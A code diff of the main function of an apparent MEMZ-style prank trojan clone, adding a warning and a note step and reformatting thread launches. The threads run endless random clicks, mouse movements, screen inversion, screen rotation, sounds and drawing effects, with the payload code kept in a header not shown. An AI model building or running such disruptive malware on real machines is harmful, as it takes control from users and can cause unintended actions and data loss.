@@ -1,4 +1,4 @@
-#include <thread> // I Don't Know Why It Cannot Build In MEMZ.h
+#include "thread" // I Don't Know Why It Cannot Build In MEMZ.h
 #include "MEMZ.h" // Process Main 
 
 using namespace std;
@@ -6,14 +6,16 @@ using namespace std;
 int main()
 {
 	disable_redraw(); // Disable Redraw
+	StartWarning(); // Warning
+	CreateNote(); // Create Note
 	// Main Process Zone //
-    thread a(infclick); // Random Click
-    thread b(infInvColor); // Invert Screen Color
-    thread c(infIcon); // Random Draw Icons
-    thread d(infCursor); // Random Move Mouse
-    thread e(infChange); // Invert String
-    thread f(inftunnel); // Draw Tunnel Effect
-    thread g(randomDraw); // Random Draw Lines
+	thread a(infclick); // Random Click
+	thread b(infInvColor); // Invert Screen Color
+	thread c(infIcon); // Random Draw Icons
+	thread d(infCursor); // Random Move Mouse
+	thread e(infChange); // Invert String
+	thread f(inftunnel); // Draw Tunnel Effect
+	thread g(randomDraw); // Random Draw Lines
 	thread h(infplay); // Play System Error Sounds
 	thread i(infBlink); // Screen Blink
 	thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
@@ -27,7 +29,7 @@ int main()
 	thread r(randomOutput); // Random Print Texts
 	thread s(rand_beep); // Random Beep
 	thread t(sayNyan); // Your computer was not trashed by the MEMZ Trojan. Now you can't enjoy the Nyan Cat~
-	thread u(OrientationsScreen); // Random Orientations Screen
-    getchar(); // Pause Program
+	thread u(OrientationsScreen); // Random Orientations Screens
+	getchar(); // Pause Program
 	return 0; // Normal Exit
 }
